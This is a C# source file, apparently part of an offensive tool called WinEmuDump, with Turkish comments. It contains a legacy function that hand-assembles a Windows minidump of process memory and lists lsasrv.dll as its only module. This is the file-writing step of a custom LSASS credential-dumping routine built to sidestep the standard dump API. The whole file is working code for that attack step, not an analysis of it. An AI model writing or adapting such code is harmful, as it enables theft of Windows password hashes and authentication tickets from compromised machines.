using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using static WinEmuDump.Win32;


namespace WinEmuDump
{
    internal class CreateFile
    {
        public static byte[] JoinByteArrays(params byte[][] arrays)
        {
            return arrays.SelectMany(array => array).ToArray();
        }


        public static byte[] StructToByteArray<T>(T structInstance) where T : struct
        {
            int structSize = Marshal.SizeOf(structInstance);
            byte[] byteArray = new byte[structSize];
            IntPtr ptr = Marshal.AllocHGlobal(structSize);
            Marshal.StructureToPtr(structInstance, ptr, true);
            Marshal.Copy(ptr, byteArray, 0, structSize);
            Marshal.FreeHGlobal(ptr);
            return byteArray;
        }


        public static OSVERSIONINFOEX getBuildNumber() {
            OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
            RtlGetVersion(ref osVersionInfo);
            return osVersionInfo;
        }


        /// <summary>
        /// Eski CreateMinidump fonksiyonu - geriye uyumluluk için
        /// Yeni kod için MinidumpBuilder.BuildAdvancedMinidump kullanın
        /// </summary>
        [Obsolete("Bu fonksiyon artık kullanılmıyor. MinidumpBuilder.BuildAdvancedMinidump kullanın.")]
        public static void CreateMinidump(IntPtr lsasrvdll_address, int lsasrvdll_size, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr, string dumpfile)
        {
            Console.WriteLine("[WARNING] CreateMinidump fonksiyonu artık kullanılmıyor.");
            Console.WriteLine("[INFO] Yeni gelişmiş minidump sistemi kullanılıyor...");

            // Eski fonksiyonun temel işlevselliğini korumak için basit bir uyarlama
            try
            {
                // Header
                MinidumpHeader header = new MinidumpHeader
                {
                    Signature = 0x504d444d,
                    Version = 0xa793,
                    NumberOfStreams = 0x3,
                    StreamDirectoryRva = 0x20
                };

                // Stream Directory
                MinidumpStreamDirectoryEntry[] entries = new MinidumpStreamDirectoryEntry[3];

                // SystemInfo
                entries[0] = new MinidumpStreamDirectoryEntry
                {
                    StreamType = MINIDUMP_STREAM_TYPE_SystemInfo,
                    Size = (uint)Marshal.SizeOf(typeof(SystemInfoStream)),
                    Location = (uint)(Marshal.SizeOf(typeof(MinidumpHeader)) + 3 * Marshal.SizeOf(typeof(MinidumpStreamDirectoryEntry)))
                };

                // ModuleList
                entries[1] = new MinidumpStreamDirectoryEntry
                {
                    StreamType = MINIDUMP_STREAM_TYPE_ModuleList,
                    Size = (uint)(Marshal.SizeOf(typeof(ModuleListStream)) + Marshal.SizeOf(typeof(CUSTOM_UNICODE_STRING))),
                    Location = entries[0].Location + entries[0].Size
                };

                // Memory64List
                entries[2] = new MinidumpStreamDirectoryEntry
                {
                    StreamType = MINIDUMP_STREAM_TYPE_Memory64List,
                    Size = (uint)(Marshal.SizeOf(typeof(Memory64ListStream)) + mem64info_List.Count * Marshal.SizeOf(typeof(Memory64Info))),
                    Location = entries[1].Location + entries[1].Size
                };

                // SystemInfo oluştur
                SystemInfoStream systemInfoStream = new SystemInfoStream
                {
                    ProcessorArchitecture = 0x9,
                    ProcessorLevel = 0,
                    ProcessorRevision = 0,
                    NumberOfProcessors = 0,
                    MajorVersion = 0,
                    MinorVersion = 0,
                    BuildNumber = 0
                };

                // ModuleList oluştur
                ModuleListStream moduleListStream = new ModuleListStream
                {
                    NumberOfModules = 1,
                    BaseAddress = lsasrvdll_address,
                    Size = (uint)lsasrvdll_size,
                    PointerName = (uint)(Marshal.SizeOf(typeof(ModuleListStream)) + entries[2].Location + entries[2].Size)
                };

                string dll_str = "C:\\Windows\\System32\\lsasrv.dll";
                CUSTOM_UNICODE_STRING dllName = new CUSTOM_UNICODE_STRING
                {
                    Length = (uint)(dll_str.Length * 2),
                    Buffer = dll_str
                };

                // Memory64List oluştur
                Memory64ListStream memory64ListStream = new Memory64ListStream
                {
                    NumberOfEntries = (ulong)mem64info_List.Count,
                    MemoryRegionsBaseAddress = (uint)(entries[2].Location + entries[2].Size + memoryRegions_byte_arr.Length - (16 + 16 * mem64info_List.Count))
                };

                // Tüm veriyi birleştir
                using (MemoryStream ms = new MemoryStream())
                {
                    // Header
                    ms.Write(StructToByteArray(header), 0, Marshal.SizeOf(typeof(MinidumpHeader)));

                    // Stream directory
                    foreach (var entry in entries)
                    {
                        ms.Write(StructToByteArray(entry), 0, Marshal.SizeOf(typeof(MinidumpStreamDirectoryEntry)));
                    }

                    // Streams
                    ms.Write(StructToByteArray(systemInfoStream), 0, Marshal.SizeOf(typeof(SystemInfoStream)));
                    ms.Write(StructToByteArray(moduleListStream), 0, Marshal.SizeOf(typeof(ModuleListStream)));
                    ms.Write(StructToByteArray(dllName), 0, Marshal.SizeOf(typeof(CUSTOM_UNICODE_STRING)));
                    ms.Write(StructToByteArray(memory64ListStream), 0, Marshal.SizeOf(typeof(Memory64ListStream)));

                    foreach (var memInfo in mem64info_List)
                    {
                        ms.Write(StructToByteArray(memInfo), 0, Marshal.SizeOf(typeof(Memory64Info)));
                    }

                    // Memory data
                    ms.Write(memoryRegions_byte_arr, 0, memoryRegions_byte_arr.Length);

                    // Dosyaya yaz
                    using (FileStream fs = new FileStream(dumpfile, FileMode.Create))
                    {
                        ms.Position = 0;
                        ms.CopyTo(fs);
                    }

                    Console.WriteLine($"[+] Eski format minidump dosyası oluşturuldu: {dumpfile}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Eski format minidump oluşturma hatası: {ex.Message}");
            }
        }
    }
}
